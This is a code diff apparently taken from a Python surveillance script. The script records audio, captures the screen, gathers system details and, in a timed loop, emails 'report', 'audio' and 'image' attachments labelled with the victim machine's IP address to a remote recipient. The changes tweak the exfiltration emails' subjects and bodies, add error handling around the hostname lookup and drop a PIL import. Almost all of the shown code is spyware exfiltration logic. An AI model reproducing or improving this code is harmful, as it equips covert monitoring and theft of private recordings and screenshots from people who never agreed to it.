@@ -10,7 +10,6 @@ from scipy.io.wavfile import write
 from cryptography.fernet import Fernet
 from requests import get
 from multiprocessing import Process, freeze_support
-from PIL import ImageGrab
 import socket,platform,time,os,smtplib,getpass,pyautogui
 import sounddevice as sd
 import getpass
@@ -90,8 +89,14 @@ while timerIterations < periodOfAction:
             msg = MIMEMultipart()
             msg['From'] = incoming
             msg['To'] = towho   
-            msg['Subject'] = "sys_report.v1"
-            body = "this is your report sent from: " + str(socket.gethostbyname(socket.gethostname()))
+
+            try:   
+                msg['Subject'] = "report " + str(socket.gethostbyname(socket.gethostname()))
+                body = "this is your report sent from: " + str(socket.gethostbyname(socket.gethostname()))
+            except Exception:
+                msg['Subject'] = "report"
+                body = "this is your report"
+
             msg.attach(MIMEText(body,'plain'))
             filename = filename
             attachment = open(attachment, 'rb')
@@ -116,8 +121,14 @@ while timerIterations < periodOfAction:
             msg = MIMEMultipart()
             msg['From'] = incoming
             msg['To'] = towho   
-            msg['Subject'] = "sys_report.v1"
-            body = "this is your report sent from: " + str(socket.gethostbyname(socket.gethostname()))
+
+            try:   
+                msg['Subject'] = "audio " + str(socket.gethostbyname(socket.gethostname()))
+                body = "this is your audio sent from: " + str(socket.gethostbyname(socket.gethostname()))
+            except Exception:
+                msg['Subject'] = "audio"
+                body = "this is your audio"
+
             msg.attach(MIMEText(body,'plain'))
             filename = filename
             attachment = open(attachment, 'rb')
@@ -142,8 +153,14 @@ while timerIterations < periodOfAction:
             msg = MIMEMultipart()
             msg['From'] = incoming
             msg['To'] = towho   
-            msg['Subject'] = "sys_report.v1"
-            body = "this is your report sent from: " + str(socket.gethostbyname(socket.gethostname()))
+            
+            try:   
+                msg['Subject'] = "image " + str(socket.gethostbyname(socket.gethostname()))
+                body = "this is your image sent from: " + str(socket.gethostbyname(socket.gethostname()))
+            except Exception:
+                msg['Subject'] = "image"
+                body = "this is your image"
+
             msg.attach(MIMEText(body,'plain'))
             filename = filename
             attachment = open(attachment, 'rb')
